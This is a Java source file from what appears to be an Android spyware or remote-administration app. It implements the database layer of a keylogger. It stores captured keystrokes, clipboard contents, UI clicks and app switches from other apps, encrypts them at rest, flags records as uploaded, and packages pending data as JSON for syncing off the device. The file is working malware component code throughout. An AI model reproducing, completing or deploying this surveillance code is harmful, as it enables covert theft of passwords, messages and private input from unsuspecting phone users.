package com.tarjon.admin.db;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

import com.tarjon.admin.utils.EncryptionManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * Database for storing keylogger information.
 * Uses encryption to protect sensitive data.
 */
public class KeyloggerDatabase extends SQLiteOpenHelper {

    private static final String TAG = "KeyloggerDatabase";

    // Database info
    private static final String DATABASE_NAME = "tarjon_keylogger.db";
    private static final int DATABASE_VERSION = 1;

    // Table names
    private static final String TABLE_KEYLOG = "keylog";
    private static final String TABLE_CLIPBOARD = "clipboard";
    private static final String TABLE_CLICKS = "clicks";
    private static final String TABLE_ACTIVITY = "activity";

    // Common columns
    private static final String COL_ID = "id";
    private static final String COL_APP = "app";
    private static final String COL_TIMESTAMP = "timestamp";
    private static final String COL_UPLOADED = "uploaded";

    // Keylog specific columns
    private static final String COL_WINDOW = "window";
    private static final String COL_TEXT = "text";

    // Clipboard specific columns
    private static final String COL_CONTENT = "content";

    // Click specific columns
    private static final String COL_ELEMENT_TEXT = "element_text";
    private static final String COL_ELEMENT_DESC = "element_description";

    // Activity specific columns
    private static final String COL_PACKAGE = "package";
    private static final String COL_ACTIVITY = "activity";

    private EncryptionManager encryptionManager;

    public KeyloggerDatabase(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        this.encryptionManager = new EncryptionManager();
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        // Create keylog table
        String createKeylogTable = "CREATE TABLE " + TABLE_KEYLOG + " (" +
                COL_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
                COL_APP + " TEXT, " +
                COL_WINDOW + " TEXT, " +
                COL_TEXT + " TEXT NOT NULL, " +  // Encrypted text
                COL_TIMESTAMP + " INTEGER, " +
                COL_UPLOADED + " INTEGER DEFAULT 0)";

        // Create clipboard table
        String createClipboardTable = "CREATE TABLE " + TABLE_CLIPBOARD + " (" +
                COL_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
                COL_APP + " TEXT, " +
                COL_CONTENT + " TEXT NOT NULL, " +  // Encrypted content
                COL_TIMESTAMP + " INTEGER, " +
                COL_UPLOADED + " INTEGER DEFAULT 0)";

        // Create clicks table
        String createClicksTable = "CREATE TABLE " + TABLE_CLICKS + " (" +
                COL_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
                COL_APP + " TEXT, " +
                COL_WINDOW + " TEXT, " +
                COL_ELEMENT_TEXT + " TEXT, " +
                COL_ELEMENT_DESC + " TEXT, " +
                COL_TIMESTAMP + " INTEGER, " +
                COL_UPLOADED + " INTEGER DEFAULT 0)";

        // Create activity table
        String createActivityTable = "CREATE TABLE " + TABLE_ACTIVITY + " (" +
                COL_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
                COL_PACKAGE + " TEXT, " +
                COL_ACTIVITY + " TEXT, " +
                COL_TIMESTAMP + " INTEGER, " +
                COL_UPLOADED + " INTEGER DEFAULT 0)";

        // Execute all CREATE TABLE statements
        db.execSQL(createKeylogTable);
        db.execSQL(createClipboardTable);
        db.execSQL(createClicksTable);
        db.execSQL(createActivityTable);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // Handle database version upgrades
        if (oldVersion < newVersion) {
            // Simple upgrade strategy: drop all tables and recreate
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_KEYLOG);
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_CLIPBOARD);
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_CLICKS);
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_ACTIVITY);

            onCreate(db);
        }
    }

    /**
     * Insert keylog data into the database
     * @param data Map containing keylog details (app, window, text)
     */
    public void insertKeylogData(Map<String, String> data) {
        try {
            SQLiteDatabase db = this.getWritableDatabase();

            ContentValues values = new ContentValues();
            values.put(COL_APP, data.get("app"));
            values.put(COL_WINDOW, data.get("window"));

            // Encrypt sensitive text data
            String encryptedText = encryptionManager.encryptString(data.get("text"));
            values.put(COL_TEXT, encryptedText);

            // Parse timestamp or use current time
            String timestampStr = data.get("timestamp");
            long timestamp = (timestampStr != null) ? 
                    Long.parseLong(timestampStr) : System.currentTimeMillis();
            values.put(COL_TIMESTAMP, timestamp);

            values.put(COL_UPLOADED, 0);

            db.insert(TABLE_KEYLOG, null, values);

            Log.d(TAG, "Keylog data saved to database");
        } catch (Exception e) {
            Log.e(TAG, "Error saving keylog data: " + e.getMessage());
        }
    }

    /**
     * Insert clipboard data into the database
     * @param data Map containing clipboard details (app, text)
     */
    public void insertClipboardData(Map<String, String> data) {
        try {
            SQLiteDatabase db = this.getWritableDatabase();

            ContentValues values = new ContentValues();
            values.put(COL_APP, data.get("app"));

            // Encrypt sensitive clipboard content
            String encryptedContent = encryptionManager.encryptString(data.get("text"));
            values.put(COL_CONTENT, encryptedContent);

            // Parse timestamp or use current time
            String timestampStr = data.get("timestamp");
            long timestamp = (timestampStr != null) ? 
                    Long.parseLong(timestampStr) : System.currentTimeMillis();
            values.put(COL_TIMESTAMP, timestamp);

            values.put(COL_UPLOADED, 0);

            db.insert(TABLE_CLIPBOARD, null, values);

            Log.d(TAG, "Clipboard data saved to database");
        } catch (Exception e) {
            Log.e(TAG, "Error saving clipboard data: " + e.getMessage());
        }
    }

    /**
     * Insert click data into the database
     * @param data Map containing click details (app, window, element_text, element_description)
     */
    public void insertClickData(Map<String, String> data) {
        try {
            SQLiteDatabase db = this.getWritableDatabase();

            ContentValues values = new ContentValues();
            values.put(COL_APP, data.get("app"));
            values.put(COL_WINDOW, data.get("window"));
            values.put(COL_ELEMENT_TEXT, data.get("element_text"));
            values.put(COL_ELEMENT_DESC, data.get("element_description"));

            // Parse timestamp or use current time
            String timestampStr = data.get("timestamp");
            long timestamp = (timestampStr != null) ? 
                    Long.parseLong(timestampStr) : System.currentTimeMillis();
            values.put(COL_TIMESTAMP, timestamp);

            values.put(COL_UPLOADED, 0);

            db.insert(TABLE_CLICKS, null, values);

            Log.d(TAG, "Click data saved to database");
        } catch (Exception e) {
            Log.e(TAG, "Error saving click data: " + e.getMessage());
        }
    }

    /**
     * Insert activity change data into the database
     * @param data Map containing activity details (package, activity)
     */
    public void insertActivityData(Map<String, String> data) {
        try {
            SQLiteDatabase db = this.getWritableDatabase();

            ContentValues values = new ContentValues();
            values.put(COL_PACKAGE, data.get("package"));
            values.put(COL_ACTIVITY, data.get("activity"));

            // Parse timestamp or use current time
            String timestampStr = data.get("timestamp");
            long timestamp = (timestampStr != null) ? 
                    Long.parseLong(timestampStr) : System.currentTimeMillis();
            values.put(COL_TIMESTAMP, timestamp);

            values.put(COL_UPLOADED, 0);

            db.insert(TABLE_ACTIVITY, null, values);

            Log.d(TAG, "Activity data saved to database");
        } catch (Exception e) {
            Log.e(TAG, "Error saving activity data: " + e.getMessage());
        }
    }

    /**
     * Get all pending keylog data
     * @param limit Maximum number of records to retrieve
     * @return JSON array of keylog entries
     */
    public JSONArray getPendingKeylogData(int limit) {
        JSONArray results = new JSONArray();

        try {
            SQLiteDatabase db = this.getReadableDatabase();

            String[] columns = {COL_ID, COL_APP, COL_WINDOW, COL_TEXT, COL_TIMESTAMP};
            String selection = COL_UPLOADED + " = ?";
            String[] selectionArgs = {"0"};
            String orderBy = COL_TIMESTAMP + " DESC";
            String limitStr = String.valueOf(limit);

            Cursor cursor = db.query(TABLE_KEYLOG, columns, selection, selectionArgs, null, null, orderBy, limitStr);

            while (cursor != null && cursor.moveToNext()) {
                int idIndex = cursor.getColumnIndex(COL_ID);
                int appIndex = cursor.getColumnIndex(COL_APP);
                int windowIndex = cursor.getColumnIndex(COL_WINDOW);
                int textIndex = cursor.getColumnIndex(COL_TEXT);
                int timestampIndex = cursor.getColumnIndex(COL_TIMESTAMP);

                if (idIndex != -1 && appIndex != -1 && windowIndex != -1 && textIndex != -1 && timestampIndex != -1) {
                    long id = cursor.getLong(idIndex);
                    String app = cursor.getString(appIndex);
                    String window = cursor.getString(windowIndex);
                    String encryptedText = cursor.getString(textIndex);
                    long timestamp = cursor.getLong(timestampIndex);

                    // Decrypt the text
                    String text = encryptionManager.decryptString(encryptedText);

                    JSONObject entry = new JSONObject();
                    entry.put("id", id);
                    entry.put("app", app);
                    entry.put("window", window);
                    entry.put("text", text);
                    entry.put("timestamp", timestamp);

                    results.put(entry);
                }
            }

            if (cursor != null) {
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting pending keylog data: " + e.getMessage());
        }

        return results;
    }

    /**
     * Get all pending clipboard data
     * @param limit Maximum number of records to retrieve
     * @return JSON array of clipboard entries
     */
    public JSONArray getPendingClipboardData(int limit) {
        JSONArray results = new JSONArray();

        try {
            SQLiteDatabase db = this.getReadableDatabase();

            String[] columns = {COL_ID, COL_APP, COL_CONTENT, COL_TIMESTAMP};
            String selection = COL_UPLOADED + " = ?";
            String[] selectionArgs = {"0"};
            String orderBy = COL_TIMESTAMP + " DESC";
            String limitStr = String.valueOf(limit);

            Cursor cursor = db.query(TABLE_CLIPBOARD, columns, selection, selectionArgs, null, null, orderBy, limitStr);

            while (cursor != null && cursor.moveToNext()) {
                int idIndex = cursor.getColumnIndex(COL_ID);
                int appIndex = cursor.getColumnIndex(COL_APP);
                int contentIndex = cursor.getColumnIndex(COL_CONTENT);
                int timestampIndex = cursor.getColumnIndex(COL_TIMESTAMP);

                if (idIndex != -1 && appIndex != -1 && contentIndex != -1 && timestampIndex != -1) {
                    long id = cursor.getLong(idIndex);
                    String app = cursor.getString(appIndex);
                    String encryptedContent = cursor.getString(contentIndex);
                    long timestamp = cursor.getLong(timestampIndex);

                    // Decrypt the content
                    String content = encryptionManager.decryptString(encryptedContent);

                    JSONObject entry = new JSONObject();
                    entry.put("id", id);
                    entry.put("app", app);
                    entry.put("content", content);
                    entry.put("timestamp", timestamp);

                    results.put(entry);
                }
            }

            if (cursor != null) {
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting pending clipboard data: " + e.getMessage());
        }

        return results;
    }

    /**
     * Mark data as uploaded in a specified table
     */
    public void markAsUploaded(String tableName, long id) {
        try {
            SQLiteDatabase db = this.getWritableDatabase();

            ContentValues values = new ContentValues();
            values.put(COL_UPLOADED, 1);

            String whereClause = COL_ID + " = ?";
            String[] whereArgs = {String.valueOf(id)};

            db.update(tableName, values, whereClause, whereArgs);

            Log.d(TAG, "Marked item " + id + " as uploaded in " + tableName);
        } catch (Exception e) {
            Log.e(TAG, "Error marking as uploaded: " + e.getMessage());
        }
    }

    /**
     * Get all pending data (keylog, clipboard, clicks, activity) for syncing
     * @return JSONObject containing all pending data
     */
    public JSONObject getAllPendingData() {
        JSONObject allData = new JSONObject();

        try {
            // Get data from each table
            JSONArray keylogData = getPendingKeylogData(100);
            JSONArray clipboardData = getPendingClipboardData(50);
            JSONArray clicksData = getPendingClicksData(100);
            JSONArray activityData = getPendingActivityData(50);

            // Add to result object
            allData.put("keylog", keylogData);
            allData.put("clipboard", clipboardData);
            allData.put("clicks", clicksData);
            allData.put("activity", activityData);

        } catch (Exception e) {
            Log.e(TAG, "Error getting all pending data: " + e.getMessage());
        }

        return allData;
    }

    /**
     * Get all pending clicks data
     * @param limit Maximum number of records to retrieve
     * @return JSON array of click entries
     */
    public JSONArray getPendingClicksData(int limit) {
        JSONArray results = new JSONArray();

        try {
            SQLiteDatabase db = this.getReadableDatabase();

            String[] columns = {
                    COL_ID, COL_APP, COL_WINDOW, COL_ELEMENT_TEXT, COL_ELEMENT_DESC, COL_TIMESTAMP
            };
            String selection = COL_UPLOADED + " = ?";
            String[] selectionArgs = {"0"};
            String orderBy = COL_TIMESTAMP + " DESC";
            String limitStr = String.valueOf(limit);

            Cursor cursor = db.query(TABLE_CLICKS, columns, selection, selectionArgs, null, null, orderBy, limitStr);

            while (cursor != null && cursor.moveToNext()) {
                int idIndex = cursor.getColumnIndex(COL_ID);
                int appIndex = cursor.getColumnIndex(COL_APP);
                int windowIndex = cursor.getColumnIndex(COL_WINDOW);
                int elemTextIndex = cursor.getColumnIndex(COL_ELEMENT_TEXT);
                int elemDescIndex = cursor.getColumnIndex(COL_ELEMENT_DESC);
                int timestampIndex = cursor.getColumnIndex(COL_TIMESTAMP);

                if (idIndex != -1 && appIndex != -1 && windowIndex != -1 && 
                        elemTextIndex != -1 && elemDescIndex != -1 && timestampIndex != -1) {
                    
                    long id = cursor.getLong(idIndex);
                    String app = cursor.getString(appIndex);
                    String window = cursor.getString(windowIndex);
                    String elementText = cursor.getString(elemTextIndex);
                    String elementDesc = cursor.getString(elemDescIndex);
                    long timestamp = cursor.getLong(timestampIndex);

                    JSONObject entry = new JSONObject();
                    entry.put("id", id);
                    entry.put("app", app);
                    entry.put("window", window);
                    entry.put("element_text", elementText);
                    entry.put("element_description", elementDesc);
                    entry.put("timestamp", timestamp);

                    results.put(entry);
                }
            }

            if (cursor != null) {
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting pending clicks data: " + e.getMessage());
        }

        return results;
    }

    /**
     * Get all pending activity data
     * @param limit Maximum number of records to retrieve
     * @return JSON array of activity entries
     */
    public JSONArray getPendingActivityData(int limit) {
        JSONArray results = new JSONArray();

        try {
            SQLiteDatabase db = this.getReadableDatabase();

            String[] columns = {COL_ID, COL_PACKAGE, COL_ACTIVITY, COL_TIMESTAMP};
            String selection = COL_UPLOADED + " = ?";
            String[] selectionArgs = {"0"};
            String orderBy = COL_TIMESTAMP + " DESC";
            String limitStr = String.valueOf(limit);

            Cursor cursor = db.query(TABLE_ACTIVITY, columns, selection, selectionArgs, null, null, orderBy, limitStr);

            while (cursor != null && cursor.moveToNext()) {
                int idIndex = cursor.getColumnIndex(COL_ID);
                int packageIndex = cursor.getColumnIndex(COL_PACKAGE);
                int activityIndex = cursor.getColumnIndex(COL_ACTIVITY);
                int timestampIndex = cursor.getColumnIndex(COL_TIMESTAMP);

                if (idIndex != -1 && packageIndex != -1 && activityIndex != -1 && timestampIndex != -1) {
                    long id = cursor.getLong(idIndex);
                    String packageName = cursor.getString(packageIndex);
                    String activity = cursor.getString(activityIndex);
                    long timestamp = cursor.getLong(timestampIndex);

                    JSONObject entry = new JSONObject();
                    entry.put("id", id);
                    entry.put("package", packageName);
                    entry.put("activity", activity);
                    entry.put("timestamp", timestamp);

                    results.put(entry);
                }
            }

            if (cursor != null) {
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting pending activity data: " + e.getMessage());
        }

        return results;
    }

    /**
     * Delete old data to prevent database bloat
     * @param daysToKeep Number of days to keep data
     */
    public void cleanupOldData(int daysToKeep) {
        try {
            SQLiteDatabase db = this.getWritableDatabase();

            // Calculate timestamp for data to delete (older than daysToKeep)
            long cutoffTime = System.currentTimeMillis() - (daysToKeep * 24 * 60 * 60 * 1000L);

            // Cleanup old data from all tables
            String whereClause = COL_TIMESTAMP + " < ? AND " + COL_UPLOADED + " = ?";
            String[] whereArgs = {String.valueOf(cutoffTime), "1"};

            int keylogDeleted = db.delete(TABLE_KEYLOG, whereClause, whereArgs);
            int clipboardDeleted = db.delete(TABLE_CLIPBOARD, whereClause, whereArgs);
            int clicksDeleted = db.delete(TABLE_CLICKS, whereClause, whereArgs);
            int activityDeleted = db.delete(TABLE_ACTIVITY, whereClause, whereArgs);

            Log.d(TAG, "Cleaned up old data: keylog=" + keylogDeleted + 
                    ", clipboard=" + clipboardDeleted + 
                    ", clicks=" + clicksDeleted + 
                    ", activity=" + activityDeleted);
        } catch (Exception e) {
            Log.e(TAG, "Error cleaning up old data: " + e.getMessage());
        }
    }

    /**
     * Get a list of apps where keylogging has captured data
     * @return List of app package names
     */
    public List<String> getAppsWithKeylogData() {
        List<String> apps = new ArrayList<>();

        try {
            SQLiteDatabase db = this.getReadableDatabase();

            String[] columns = {COL_APP};
            String groupBy = COL_APP;

            Cursor cursor = db.query(true, TABLE_KEYLOG, columns, null, null, groupBy, null, null, null);

            while (cursor != null && cursor.moveToNext()) {
                int appIndex = cursor.getColumnIndex(COL_APP);
                if (appIndex != -1) {
                    String app = cursor.getString(appIndex);
                    if (app != null && !app.isEmpty()) {
                        apps.add(app);
                    }
                }
            }

            if (cursor != null) {
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting apps with keylog data: " + e.getMessage());
        }

        return apps;
    }
}
